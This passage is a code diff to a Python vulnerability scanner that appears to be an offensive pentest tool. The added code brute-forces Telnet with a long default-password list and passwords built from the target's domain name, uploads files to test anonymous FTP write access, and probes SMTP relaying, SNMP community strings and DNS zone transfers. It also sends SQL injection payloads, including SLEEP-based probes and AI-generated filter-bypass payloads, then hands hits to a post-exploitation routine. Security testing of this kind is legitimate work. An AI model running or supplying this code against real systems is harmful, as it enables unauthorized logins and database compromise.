@@ -2173,7 +2173,7 @@ async def scan_rtsp(target, output, tech, report, session_cookies=None):
 
 # --- SQL Injection Helper Functions ---
 async def scan_exposed_services(target, output, tech, report, session_cookies=None):
-    output.print("\n[+] Starting Scan for Exposed Basic Services...")
+    output.print("\n[+] Starting Enhanced Scan for Exposed Basic Services...")
     domain = get_domain(normalize_target(target))
     
     service_ports = {
@@ -2181,136 +2181,300 @@ async def scan_exposed_services(target, output, tech, report, session_cookies=No
         "SMB (NetBIOS)": 139, "SNMP": 161, "SMB (Direct)": 445, "RDP": 3389, "VNC": 5900
     }
 
+    # --- Idea 3: Contextual & Limited Credential List ---
+    limited_credentials = [
+        ('root', 'root'), ('admin', 'admin'), ('admin', 'password'), ('test', 'test'),
+        ('user', 'user'), ('ubuntu', 'ubuntu'), ('guest', 'guest')
+    ]
+    try:
+        domain_parts = domain.split('.')
+        base_name = domain_parts[0]
+        limited_credentials.extend([
+            ('admin', base_name), ('admin', f"{base_name}123"),
+            (base_name, base_name), ('root', base_name)
+        ])
+    except Exception:
+        pass # Ignore if domain parsing fails
+
+    # --- Idea 1: Known Vulnerable Versions ---
+    vulnerable_versions = {
+        "vsftpd 2.3.4": "Critical - Backdoor (RCE)",
+        "ProFTPD 1.3.5": "Critical - RCE",
+        "OpenSSH 7.7": "High - User Enumeration (CVE-2018-15473)"
+    }
+
+    # --- Idea 1: Known Vulnerable SSH Versions (for intelligent banner analysis) ---
+    VULNERABLE_SSH_VERSIONS = {
+        "OpenSSH_7.7": "High - User Enumeration (CVE-2018-15473)",
+        "OpenSSH_7.2p2 Ubuntu-4ubuntu2.2": "Medium - Authentication Bypass (CVE-2016-6210)",
+        "OpenSSH_5.3": "High - Pre-auth user enumeration (CVE-2012-0814)"
+    }
+
+    # --- Idea 3: Common Credentials for Brute-Force ---
+    COMMON_CREDENTIALS = [
+        ('root', 'root'), ('admin', 'admin'), ('admin', 'password'), ('test', 'test'),
+        ('user', 'user'), ('ubuntu', 'ubuntu'), ('guest', 'guest'), ('pi', 'raspberry'),
+        ('operator', 'operator'), ('support', 'support'), ('ftp', 'ftp'), ('anonymous', 'anonymous'),
+        ('admin', '123456'), ('admin', '1234'), ('user', '12345'), ('test', '12345'),
+        ('admin', 'admin123'), ('admin', 'password123'), ('manager', 'secret'), ('support', '123456789'),
+        ('111111', '111111'), ('000000', '000000'), ('default', 'default'), ('changeme', 'changeme'),
+        ('welcome', 'welcome'), ('system', 'system'), ('toor', 'toor'), ('pass', 'pass'),
+        ('letmein', 'letmein'), ('security', 'security'), ('football', 'football'), ('sunshine', 'sunshine'),
+        ('raspberry', 'raspberry'), ('tomcat', 'tomcat'), ('jboss', 'jboss'), ('oracle', 'oracle'),
+        ('postgres', 'postgres'), ('mysql', 'mysql'), ('mssql', 'mssql'), ('admin', 'admin'),
+        ('admin', 'admin1'), ('admin', 'admin12'), ('admin', 'admin12345'), ('admin', 'admin123456'),
+        ('admin', 'administrator'), ('admin', 'adminadmin'), ('admin', 'adminpass'), ('admin', 'adminpass123'),
+        ('admin', 'admin@123'), ('admin', 'Password@123'), ('admin', 'Welcome123!'), ('admin', 'Changeme123!'),
+        ('admin', '123!@#'), ('admin', 'adm'), ('admin', 'sys'), ('admin', '1234567'), ('admin', 'P@ssword'),
+        ('admin', 'p@ssword'), ('admin', 'password!'), ('admin', 'admin!'), ('admin', 'root!'),
+        ('admin', '123'), ('admin', 'pass123'), ('admin', 'user123'), ('admin', 'login'),
+        ('admin', 'master'), ('admin', 'key'), ('admin', 'access'), ('admin', 'local'),
+        ('admin', 'live'), ('admin', 'demo'), ('admin', 'test1234'), ('admin', 'qwerty1234'),
+        ('admin', 'iloveyou'), ('admin', 'company'), ('admin', '1234567890'), ('admin', 'password1234'),
+        ('admin', 'admin1234'), ('admin', 'changeme123'), ('admin', 'Welcome123'), ('admin', '!@#$%^&*'),
+        ('admin', 'p@55w0rd'), ('admin', 'P@55w0rd'), ('admin', 'letmein123'), ('admin', 'admin2023'),
+        ('admin', 'admin2024'), ('admin', 'admin2025'), ('admin', 'admin2026'), ('admin', 'companyname'),
+        ('admin', '12345678901'), ('admin', '123456789012'), ('admin', '123qweasd'), ('admin', '1qaz2wsx3edc'),
+        ('admin', '1qaz@WSX'), ('admin', '2023'), ('admin', '2024'), ('admin', '2025'), ('admin', '2026'),
+    ]
+
     for service_name, port in service_ports.items():
         output.print(f"  [*] Checking {service_name} on port {port}...")
         try:
-            reader, writer = await asyncio.open_connection(domain, port)
-            writer.close()
-            await writer.wait_closed()
-            output.print(f"    [INFO] Port {port} ({service_name}) is open.")
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=4)
             
-            # Service-specific checks
-            if service_name == "FTP":
-                output.print("      [*] Attempting anonymous FTP login...")
-                try:
-                    reader, writer = await asyncio.open_connection(domain, port)
-                    response = await asyncio.wait_for(reader.read(1024), timeout=3)
-                    writer.write(b"USER anonymous\r\n")
-                    await writer.drain()
-                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
-                    writer.write(b"PASS anonymous\r\n")
-                    await writer.drain()
-                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
-                    writer.write(b"LIST\r\n")
-                    await writer.drain()
-                    response += await asyncio.wait_for(reader.read(2048), timeout=3)
-                    writer.close()
-                    await writer.wait_closed()
-                    
-                    if b"230 Login successful" in response:
-                        output.print(f"        [CRITICAL] Anonymous FTP login successful on {domain}:{port}!")
-                        report.add_finding("Anonymous FTP Access", "Critical", f"{domain}:{port}", "N/A", "anonymous:anonymous",
-                                           "Anonymous FTP access is enabled, potentially exposing sensitive files and allowing unauthorized uploads.",
-                                           "Disable anonymous FTP access. Ensure proper authentication and authorization are in place.",
-                                           f"FTP banner and response:\n{response.decode(errors='ignore')}")
-                    else:
-                        output.print("        [INFO] Anonymous FTP login failed.")
-                except Exception as e:
-                    output.print(f"        [ERROR] FTP check failed: {e}")
+            # General Banner Grabbing
+            banner = ""
+            try:
+                banner_bytes = await asyncio.wait_for(reader.read(1024), timeout=3)
+                banner = banner_bytes.decode(errors='ignore').strip()
+                if banner:
+                    output.print(f"    [INFO] Port {port} ({service_name}) is open. Banner: {banner}")
+            except asyncio.TimeoutError:
+                 output.print(f"    [INFO] Port {port} ({service_name}) is open, but no banner received.")
+            except Exception:
+                 output.print(f"    [INFO] Port {port} ({service_name}) is open.")
 
+            # --- Idea 1: Banner/Version Analysis ---
+            for version, vuln_info in vulnerable_versions.items():
+                if version.lower() in banner.lower():
+                    output.print(f"    [CRITICAL] Known vulnerable version detected: {version} ({vuln_info})")
+                    report.add_finding(f"Known Vulnerable Service ({vuln_info})", "Critical", f"{domain}:{port}", "Banner", version,
+                                       f"The service is running a version known to be vulnerable: {vuln_info}.",
+                                       "Immediately upgrade the service to a patched version.", banner)
+
+            # --- Service-specific checks ---
+            if service_name == "FTP":
+                writer.write(b"USER anonymous\r\n")
+                await writer.drain()
+                res_user = await asyncio.wait_for(reader.read(1024), timeout=3)
+                writer.write(b"PASS anonymous\r\n")
+                await writer.drain()
+                res_pass = await asyncio.wait_for(reader.read(1024), timeout=3)
+                
+                if b"230" in res_pass or b"230" in res_user:
+                    output.print("      [HIGH] Anonymous FTP login successful.")
+                    evidence = f"FTP banner and response:\n{banner}\n{res_user.decode(errors='ignore')}{res_pass.decode(errors='ignore')}"
+                    
+                    # --- Idea 2: Check for Write Permissions ---
+                    test_file = f"test_{get_random_string(4)}.txt"
+                    output.print(f"        [*] Checking for anonymous write permissions (STOR {test_file})...")
+                    writer.write(f"STOR {test_file}\r\n".encode())
+                    await writer.drain()
+                    res_stor = await asyncio.wait_for(reader.read(1024), timeout=3)
+                    if b"150" in res_stor or b"125" in res_stor: # 150/125 OK to send data
+                        writer.write(b"test_content\r\n.\r\n")
+                        await writer.drain()
+                        res_stor_end = await asyncio.wait_for(reader.read(1024), timeout=3)
+                        if b"226" in res_stor_end: # 226 Transfer complete
+                            output.print("        [CRITICAL] Anonymous FTP write access confirmed!")
+                            evidence += f"\nAnonymous user has WRITE PERMISSIONS. Successfully uploaded '{test_file}'."
+                            report.add_finding("Anonymous FTP Write Access", "Critical", f"{domain}:{port}", "N/A", "anonymous:anonymous",
+                                               "Anonymous FTP access with write permissions is enabled, allowing anyone to upload files.",
+                                               "Disable anonymous FTP access, or at least remove write permissions for the anonymous user.", evidence)
+                            writer.write(f"DELE {test_file}\r\n".encode()) # Cleanup
+                            await writer.drain()
+                        else:
+                             report.add_finding("Anonymous FTP Access", "High", f"{domain}:{port}", "N/A", "anonymous:anonymous",
+                                               "Anonymous FTP access is enabled, potentially exposing sensitive files.",
+                                               "Disable anonymous FTP access. Ensure proper authentication and authorization are in place.", evidence)
+                    else:
+                        report.add_finding("Anonymous FTP Access", "High", f"{domain}:{port}", "N/A", "anonymous:anonymous",
+                                           "Anonymous FTP access is enabled, potentially exposing sensitive files.",
+                                           "Disable anonymous FTP access, or at least remove write permissions for the anonymous user.", evidence,
+                                           future_vector="Attempt to upload files to the anonymous FTP server to check for write permissions.")
+            
             elif service_name == "SSH":
-                output.print("      [*] Grabbing SSH banner...")
-                try:
-                    reader, writer = await asyncio.open_connection(domain, port)
-                    banner = await asyncio.wait_for(reader.read(1024), timeout=3)
-                    writer.close()
-                    await writer.wait_closed()
-                    output.print(f"        [INFO] SSH Banner: {banner.decode(errors='ignore').strip()}")
-                    report.add_finding("SSH Service Detected", "Info", f"{domain}:{port}", "N/A", "N/A",
-                                       f"SSH service detected with banner: {banner.decode(errors='ignore').strip()}",
-                                       "Ensure SSH is properly configured with strong authentication and up-to-date software.",
-                                       f"SSH Banner: {banner.decode(errors='ignore').strip()}")
-                except Exception as e:
-                    output.print(f"        [ERROR] SSH banner grab failed: {e}")
+                output.print("      [*] Performing intelligent banner analysis for SSH...")
+                if banner:
+                    for vuln_version, vuln_info in VULNERABLE_SSH_VERSIONS.items():
+                        if vuln_version.lower() in banner.lower():
+                            output.print(f"        [CRITICAL] Known vulnerable SSH version detected: {banner} ({vuln_info})")
+                            report.add_finding(f"Known Vulnerable SSH ({vuln_info.split(' - ')[0]})", "Critical", f"{domain}:{port}", "Banner", banner,
+                                               f"The SSH service is running a version known to be vulnerable: {banner} ({vuln_info}).",
+                                               "Immediately upgrade the SSH service to a patched version. Disable unnecessary features.", banner)
+                            break
+                    else:
+                        output.print(f"        [INFO] SSH banner: {banner}. No known critical vulnerabilities detected in banner.")
+                else:
+                    output.print("        [INFO] No SSH banner received for analysis.")
 
             elif service_name == "Telnet":
-                output.print("      [*] Grabbing Telnet banner and attempting simple login...")
+                output.print("      [*] Attempting limited brute-force on Telnet...")
+                # Generate contextual passwords
+                contextual_credentials = list(COMMON_CREDENTIALS)
                 try:
-                    reader, writer = await asyncio.open_connection(domain, port)
-                    banner = await asyncio.wait_for(reader.read(1024), timeout=3)
-                    output.print(f"        [INFO] Telnet Banner: {banner.decode(errors='ignore').strip()}")
-                    
-                    # Attempt very basic login
-                    writer.write(b"admin\r\n")
-                    await writer.drain()
-                    response = await asyncio.wait_for(reader.read(1024), timeout=3)
-                    writer.write(b"password\r\n")
-                    await writer.drain()
-                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
-                    writer.close()
-                    await writer.wait_closed()
-
-                    if b"Login successful" in response or b"Welcome" in response:
-                        output.print(f"        [CRITICAL] Simple Telnet login successful (admin:password) on {domain}:{port}!")
-                        report.add_finding("Telnet Weak Credentials", "Critical", f"{domain}:{port}", "N/A", "admin:password",
-                                           "Telnet service allows simple 'admin:password' login, indicating weak or default credentials. Telnet is also unencrypted.",
-                                           "Disable Telnet and use SSH. If Telnet is necessary, enforce strong authentication and disable default credentials.",
-                                           f"Telnet banner and response:\n{banner.decode(errors='ignore')}\n{response.decode(errors='ignore')}")
-                    else:
-                        output.print("        [INFO] Simple Telnet login failed.")
-                except Exception as e:
-                    output.print(f"        [ERROR] Telnet check failed: {e}")
+                    domain_parts = domain.split('.')
+                    base_name = domain_parts[0]
+                    contextual_credentials.extend([
+                        (base_name, base_name), (base_name, f"{base_name}123"),
+                        (f"{base_name}admin", f"{base_name}admin"), (f"{base_name}user", f"{base_name}user"),
+                        ('admin', base_name), ('user', base_name), ('root', base_name)
+                    ])
+                except Exception:
+                    pass # Ignore if domain parsing fails
+                
+                for user, pwd in list(set(contextual_credentials)): # Use set to remove duplicates
+                    try:
+                        t_reader, t_writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=3)
+                        await asyncio.wait_for(t_reader.read(2048), timeout=3) # Wait for login prompt
+                        t_writer.write(f"{user}\r\n".encode())
+                        await t_writer.drain()
+                        await asyncio.wait_for(t_reader.read(2048), timeout=3) # Wait for password prompt
+                        t_writer.write(f"{pwd}\r\n".encode())
+                        await t_writer.drain()
+                        response = await asyncio.wait_for(t_reader.read(4096), timeout=3)
+                        if any(success_msg in response.decode(errors='ignore').lower() for success_msg in ['welcome', 'logged in', 'last login', '$', '#', '>']):
+                            output.print(f"        [CRITICAL] Telnet login successful with weak credentials: {user}:{pwd}")
+                            report.add_finding("Telnet Weak Credentials", "Critical", f"{domain}:{port}", "Login", f"{user}:{pwd}",
+                                               "Telnet service allows login with weak/default credentials. Telnet is also unencrypted.",
+                                               "Disable Telnet and use SSH. If Telnet is necessary, enforce strong authentication.", f"Successful credentials: {user}:{pwd}")
+                            t_writer.close()
+                            await t_writer.wait_closed()
+                            break # Found one, stop
+                        t_writer.close()
+                        await t_writer.wait_closed()
+                    except Exception:
+                        continue # Try next credential
 
             elif service_name == "SMTP":
-                output.print("      [*] Attempting SMTP user enumeration (VRFY/EXPN)...")
+                output.print("      [*] Attempting SMTP user enumeration (VRFY) and Open Relay check...")
                 try:
-                    reader, writer = await asyncio.open_connection(domain, port)
-                    response = await asyncio.wait_for(reader.read(1024), timeout=3)
-                    writer.write(b"HELO test.com\r\n")
-                    await writer.drain()
-                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
-
-                    users_to_test = ["root", "admin", "test", "postmaster"]
-                    found_users = []
-                    for user in users_to_test:
-                        writer.write(f"VRFY {user}\r\n".encode())
-                        await writer.drain()
-                        vrfy_response = await asyncio.wait_for(reader.read(1024), timeout=3)
-                        if b"250" in vrfy_response: # 250 OK means user exists
-                            found_users.append(user)
-                            output.print(f"          [HIGH] SMTP VRFY: User '{user}' exists.")
-                        elif b"550" not in vrfy_response: # Not 550 (user unknown) but not 250 (e.g., 502 command not implemented)
-                            output.print(f"          [INFO] SMTP VRFY for '{user}' returned: {vrfy_response.decode(errors='ignore').strip()}")
+                    s_reader, s_writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=3)
+                    banner_smtp = await s_reader.read(1024) # Banner
+                    output.print(f"        [INFO] SMTP Banner: {banner_smtp.decode(errors='ignore').strip()}")
+                    s_writer.write(b"HELO test.com\r\n")
+                    await s_writer.drain()
+                    await s_reader.read(1024)
                     
-                    writer.write(b"QUIT\r\n")
-                    await writer.drain()
-                    writer.close()
-                    await writer.wait_closed()
-
+                    # User Enum
+                    found_users = []
+                    for user in ["root", "admin", "test", "postmaster", "info", "support"]:
+                        s_writer.write(f"VRFY {user}\r\n".encode())
+                        await s_writer.drain()
+                        vrfy_res = await asyncio.wait_for(s_reader.read(1024), timeout=3)
+                        if b"250" in vrfy_res or b"252" in vrfy_res:
+                            found_users.append(user)
                     if found_users:
-                        report.add_finding("SMTP User Enumeration", "Medium", f"{domain}:{port}", "N/A", "VRFY/EXPN",
-                                           f"SMTP service allows user enumeration via VRFY command. Found users: {', '.join(found_users)}.",
-                                           "Disable VRFY and EXPN commands on the SMTP server to prevent user enumeration.",
-                                           f"SMTP VRFY responses:\n{response.decode(errors='ignore')}")
-                    else:
-                        output.print("        [INFO] No users enumerated via SMTP VRFY.")
+                        output.print(f"        [MEDIUM] SMTP VRFY: Found users: {', '.join(found_users)}")
+                        report.add_finding("SMTP User Enumeration (VRFY)", "Medium", f"{domain}:{port}", "VRFY", ", ".join(found_users),
+                                           f"SMTP service allows user enumeration via VRFY. Found users: {', '.join(found_users)}.",
+                                           "Disable VRFY and EXPN commands on the SMTP server.", f"VRFY for {', '.join(found_users)} returned success code.",
+                                           future_vector="Attempt brute-force login with discovered usernames.")
+                    
+                    # --- Idea 2: Open Relay Check ---
+                    s_writer.write(b"MAIL FROM:<test@example.com>\r\n")
+                    await s_writer.drain()
+                    res_mail = await asyncio.wait_for(s_reader.read(1024), timeout=3)
+                    if b"250" in res_mail:
+                        s_writer.write(b"RCPT TO:<external@external.com>\r\n") # Use an external domain for testing
+                        await s_writer.drain()
+                        res_rcpt = await asyncio.wait_for(s_reader.read(1024), timeout=3)
+                        if b"250" in res_rcpt:
+                            output.print("        [HIGH] SMTP server might be an Open Relay.")
+                            report.add_finding("SMTP Open Relay", "High", f"{domain}:{port}", "RELAY", "N/A",
+                                               "The SMTP server appears to be an open relay, which can be abused by spammers.",
+                                               "Configure the SMTP server to only accept and relay mail for authorized domains and users.", f"MAIL FROM and RCPT TO commands were accepted for external domain external.com.",
+                                               future_vector="Verify open relay by sending a test email through the server.")
+                    s_writer.close()
+                    await s_writer.wait_closed()
                 except Exception as e:
                     output.print(f"        [ERROR] SMTP check failed: {e}")
-            
-            elif service_name in ["SMB (NetBIOS)", "SMB (Direct)", "RDP", "VNC", "SNMP", "DNS"]:
-                # For these services, simply reporting the open port is sufficient for this module.
-                # Deeper attacks (brute-force, zone transfer, community string guessing) would require
-                # external tools or more complex protocol implementations, which are beyond the scope
-                # of this basic service check to avoid over-complicating and breaking existing flows.
-                report.add_finding(f"{service_name} Service Detected", "Info", f"{domain}:{port}", "N/A", "N/A",
-                                   f"{service_name} service detected on port {port}. Further manual investigation is recommended.",
-                                   f"Ensure {service_name} is properly secured and not exposed unnecessarily. Implement strong authentication if applicable.",
-                                   f"Port {port} is open for {service_name}.")
+
+            elif service_name in ["SMB (NetBIOS)", "SMB (Direct)"]:
+                output.print("      [*] Checking for anonymous SMB share listing...")
+                try:
+                    proc = await asyncio.create_subprocess_exec('smbclient', '-L', f'//{domain}', '-N', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
+                    smb_output = stdout.decode(errors='ignore')
+                    
+                    if proc.returncode == 0 and "Disk" in smb_output and "IPC$" in smb_output:
+                        output.print("        [HIGH] Anonymous SMB shares found.")
+                        report.add_finding("Anonymous SMB Share Listing", "High", f"{domain}:{port}", "N/A", "N/A",
+                                           "The SMB server allows anonymous listing of shares, exposing internal host and share names.",
+                                           "Disable anonymous access to SMB shares. Enforce authentication.", f"smbclient output:\n{smb_output}",
+                                           future_vector="Attempt to connect to discovered SMB shares to access files.")
+                    else:
+                        output.print("        [INFO] No anonymous SMB shares found or smbclient output was not indicative.")
+                except FileNotFoundError:
+                    output.print("        [WARNING] `smbclient` tool not found. Please ensure it is installed and in your PATH. Skipping SMB check.")
+                except asyncio.TimeoutError:
+                    output.print("        [INFO] SMB check timed out.")
+                except Exception as e:
+                    output.print(f"        [ERROR] SMB check failed: {e}")
+
+            elif service_name == "SNMP":
+                output.print("      [*] Checking for public/private SNMP community strings...")
+                for community in ['public', 'private']:
+                    try:
+                        proc = await asyncio.create_subprocess_exec('snmpwalk', '-v2c', '-c', community, domain, 'system', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
+                        snmp_output = stdout.decode(errors='ignore')
+                        
+                        if proc.returncode == 0 and "iso." in snmp_output:
+                            output.print(f"        [HIGH] SNMP access successful with '{community}' community string.")
+                            report.add_finding("SNMP Weak Community String", "High", f"{domain}:{port}", "Community String", community,
+                                               f"The SNMP service is accessible with the default community string '{community}', exposing sensitive device information.",
+                                               "Change default SNMP community strings to strong, unpredictable values. Use SNMPv3 if possible.", f"snmpwalk output snippet:\n{snmp_output[:500]}...",
+                                               future_vector="Attempt to enumerate more SNMP OIDs for sensitive information disclosure.")
+                            break # Found one, no need to check others
+                    except FileNotFoundError:
+                        output.print("        [WARNING] `snmpwalk` tool not found. Please ensure it is installed and in your PATH. Skipping SNMP check.")
+                        break
+                    except asyncio.TimeoutError:
+                        output.print(f"        [INFO] SNMP check for '{community}' timed out.")
+                    except Exception as e:
+                        output.print(f"        [ERROR] SNMP check for '{community}' failed: {e}")
+
+            elif service_name == "DNS":
+                output.print("      [*] Attempting DNS Zone Transfer (AXFR)...")
+                try:
+                    proc = await asyncio.create_subprocess_exec('dig', 'axfr', f'@{domain}', domain, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=20)
+                    dig_output = stdout.decode(errors='ignore')
+                    
+                    if proc.returncode == 0 and "Transfer failed." not in dig_output and len(dig_output) > 200:
+                        output.print("        [HIGH] DNS Zone Transfer successful.")
+                        report.add_finding("DNS Zone Transfer (AXFR)", "High", f"{domain}:{port}", "AXFR", domain,
+                                           "The DNS server allows a full zone transfer, exposing all DNS records for the domain.",
+                                           "Configure the DNS server to restrict zone transfers to trusted secondary DNS servers only.", f"AXFR output snippet:\n{dig_output[:500]}...",
+                                           future_vector="Analyze DNS records for internal hostnames, IP addresses, and other sensitive information.")
+                    else:
+                        output.print("        [INFO] DNS Zone Transfer failed or no significant records found.")
+                except FileNotFoundError:
+                    output.print("        [WARNING] `dig` tool not found. Please ensure it is installed and in your PATH. Skipping DNS Zone Transfer check.")
+                except asyncio.TimeoutError:
+                    output.print("        [INFO] DNS Zone Transfer check timed out.")
+                except Exception as e:
+                    output.print(f"        [ERROR] DNS Zone Transfer check failed: {e}")
+
+            writer.close()
+            await writer.wait_closed()
 
         except ConnectionRefusedError:
-            output.print(f"    [INFO] Port {port} ({service_name}) is closed or filtered (Connection Refused).")
+            output.print(f"    [INFO] Port {port} ({service_name}) is closed or filtered.")
         except asyncio.TimeoutError:
-            output.print(f"    [INFO] Port {port} ({service_name}) timed out. Likely closed or filtered.")
+            output.print(f"    [INFO] Port {port} ({service_name}) timed out.")
         except Exception as e:
             output.print(f"    [ERROR] An unexpected error occurred during {service_name} check on port {port}: {e}")
 
@@ -3090,83 +3254,101 @@ async def check_sql_injection(target, form_to_test, output, tech, report, sessio
         *["') AND pg_sleep(5)--", "')) AND pg_sleep(5)--"],
     ]
 
-    db_errors = [
-        "sql syntax", "mysql", "unclosed quotation", "oracle", "postgresql", 
-        "syntax error", "warning: mysql", "mssql", "invalid column", "unknown column",
-        "sql command not properly ended", "ora-00933", "ora-00920", "pg_query()",
-        "unclosed character string", "odbc driver"
-    ]
+    async def run_smart_exploitation(point):
+        output.print(f"  [Phase 1] Running Smart Probe for SQLi on param '{point['param']}'...")
+        
+        # 1. Error-based probe
+        probe_payload = "'"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        
+        if res and await res.text():
+            response_text = await res.text()
+            if any(e in response_text.lower() for e in db_errors):
+                output.print(f"    [CRITICAL] Error-Based SQLi confirmed with probe: '{probe_payload}'")
+                await post_exploit_sqli(point['url'], point['method'], point['param'], point['value'], probe_payload, report, output, session_cookies, point['form_data'], point['original_query'], response_text, request_details, response_details)
+                return True # Vulnerability found and exploited
 
-    async def test_sqli(url, method, param_name, original_value, form_data=None, original_query=None, use_hpp=False):
-        # Error-based check
-        for p in error_payloads:
-            for encoded_p in get_encoded_payloads(p):
-                test_url, test_data = build_request(url, method, param_name, original_value + encoded_p, form_data, original_query, use_hpp=use_hpp)
-                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res and any(e in (await res.text()).lower() for e in db_errors):
-                    output.print(f"  [CRITICAL] Error-Based SQLi confirmed in {method.upper()} param '{param_name}' with payload: {encoded_p}")
-                    # AI-driven post-exploitation could be added here
-                    return await post_exploit_sqli(url, method, param_name, original_value, encoded_p, report, output, session_cookies, form_data, original_query, await res.text(), request_details, response_details)
+        # 2. Time-based probe
+        time_probe_payload = "' AND SLEEP(5)--"
+        start_time = time.time()
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + time_probe_payload, point['form_data'], point['original_query'])
+        await _send_async_http_request(test_url, method=point['method'], data=test_data, timeout=8, output=output, session_cookies=session_cookies)
+        end_time = time.time()
+        if (end_time - start_time) > 4.5 and (end_time - start_time) < 7.5:
+            output.print(f"    [CRITICAL] Time-Based Blind SQLi confirmed with probe: '{time_probe_payload}'")
+            evidence = f"Response time was {end_time - start_time:.2f} seconds, indicating successful execution of a time-delay payload (e.g., SLEEP(5))."
+            report.add_finding("Time-Based Blind SQL Injection", "Critical", point['url'], point['param'], time_probe_payload, "The application is vulnerable to Time-Based Blind SQL Injection.", "Use parameterized queries or prepared statements.", evidence, method=point['method'])
+            return True # Vulnerability found
 
-        # Time-based blind check
-        for p in time_based_payloads:
-            start_time = time.time()
-            test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query, use_hpp=use_hpp)
-            _, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=8, output=output, session_cookies=session_cookies)
-            end_time = time.time()
-            if (end_time - start_time) > 4.5 and (end_time - start_time) < 7.5:
-                output.print(f"  [CRITICAL] Time-Based Blind SQLi confirmed in {method.upper()} param '{param_name}' with payload: {p}")
-                evidence = f"Response time was {end_time - start_time:.2f} seconds, indicating successful execution of a time-delay payload (e.g., SLEEP(5))."
-                report.add_finding("Time-Based Blind SQL Injection", "Critical", url, param_name, p, "The application is vulnerable to Time-Based Blind SQL Injection.", "Use parameterized queries or prepared statements.", evidence, method=method)
+        return False
+
+    async def run_ai_bypass(point):
+        output.print(f"  [Phase 2] Running AI-Assisted Bypass for SQLi on param '{point['param']}'...")
+        
+        probe_payload = "'"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        response_snippet = (await res.text())[:500] if res and await res.text() else "No response from server."
+
+        ai_payloads = await ai_generate_dynamic_payloads("SQL Injection", probe_payload, response_snippet, output)
+        
+        for p in ai_payloads:
+            test_url_ai, test_data_ai = build_request(point['url'], point['method'], point['param'], point['value'] + p, point['form_data'], point['original_query'])
+            res_ai, req_ai, resp_ai = await _send_async_http_request(test_url_ai, method=point['method'], data=test_data_ai, output=output, session_cookies=session_cookies)
+            if res_ai and await res_ai.text() and any(e in (await res_ai.text()).lower() for e in db_errors):
+                output.print(f"    [CRITICAL] AI-Generated Error-Based SQLi confirmed with payload: {p}")
+                await post_exploit_sqli(point['url'], point['method'], point['param'], point['value'], p, report, output, session_cookies, point['form_data'], point['original_query'], await res_ai.text(), req_ai, resp_ai)
                 return True
 
-        # AI-Powered Dynamic Payload Generation
-        if ai_enabled:
-            output.print("  [AI MODE] Initial SQLi checks failed. Generating dynamic payloads...")
-            # We need a response snippet to give the AI context
-            res_for_ai, request_details, response_details = await _send_async_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
-            response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
-            
-            ai_payloads = await ai_generate_dynamic_payloads("SQL Injection", "' OR 1=1--", response_snippet, output)
-            for p in ai_payloads:
-                # Test AI-generated payloads (both error-based and time-based)
-                # Error-based
-                test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query, use_hpp=use_hpp)
-                res, req_details, res_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res and any(e in (await res.text()).lower() for e in db_errors):
-                    output.print(f"  [CRITICAL] AI-Generated Error-Based SQLi confirmed with payload: {p}")
-                    return await post_exploit_sqli(url, method, param_name, original_value, p, report, output, session_cookies, form_data, original_query, await res.text(), req_details, res_details)
-                
-                # Time-based
-                start_time = time.time()
-                _, req_details, res_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=8, output=output, session_cookies=session_cookies)
-                end_time = time.time()
-                if (end_time - start_time) > 4.5 and (end_time - start_time) < 7.5:
-                    output.print(f"  [CRITICAL] AI-Generated Time-Based SQLi confirmed with payload: {p}")
-                    evidence = f"Response time was {end_time - start_time:.2f} seconds, indicating successful execution of an AI-generated time-delay payload."
-                    report.add_finding("AI-Generated Time-Based Blind SQL Injection", "Critical", url, param_name, p, "The application is vulnerable to Time-Based Blind SQL Injection, found with an AI-generated payload.", "Use parameterized queries or prepared statements.", evidence, method=method)
+            start_time = time.time()
+            await _send_async_http_request(test_url_ai, method=point['method'], data=test_data_ai, timeout=8, output=output, session_cookies=session_cookies)
+            end_time = time.time()
+            if (end_time - start_time) > 4.5 and (end_time - start_time) < 7.5:
+                output.print(f"    [CRITICAL] AI-Generated Time-Based SQLi confirmed with payload: {p}")
+                evidence = f"Response time was {end_time - start_time:.2f} seconds."
+                report.add_finding("AI-Generated Time-Based Blind SQL Injection", "Critical", point['url'], point['param'], p, "The application is vulnerable to Time-Based Blind SQL Injection, found with an AI-generated payload.", "Use parameterized queries or prepared statements.", evidence, method=point['method'])
+                return True
+        
+        return False
+
+    async def run_full_scan(point):
+        output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for SQLi on param '{point['param']}'...")
+        
+        for p in error_payloads:
+            for encoded_p in get_encoded_payloads(p):
+                test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
+                res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
